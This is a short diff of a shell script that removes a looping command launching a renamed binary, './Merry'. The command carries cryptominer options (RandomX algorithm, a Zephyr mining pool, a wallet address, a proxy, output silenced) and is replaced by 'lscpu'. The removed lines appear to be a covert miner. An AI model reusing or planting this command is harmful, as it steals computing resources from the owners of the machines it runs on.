@@ -122,8 +122,4 @@ ls -la
 
 sleep 2
 
-while true
-do
-./Merry --donate-level 1 -o us.zephyr.herominers.com:1123 -a rx/0 -u ZEPHYR34MGwFTPeqZtuzm7VsAujvy9XEicJtwWkcKJVYJzDwHpw9YAW4XPLw5QLRiAFswe9pAfckTjYXVzGnAvDHdQ7FUVTcpgy4g -p $currentdate -k --verbose --randomx-1gb-pages -t $used_num_of_cores -k --proxy=127.0.0.1:1081 1>/dev/null 2>&1
-sleep 10
-done
+lscpu
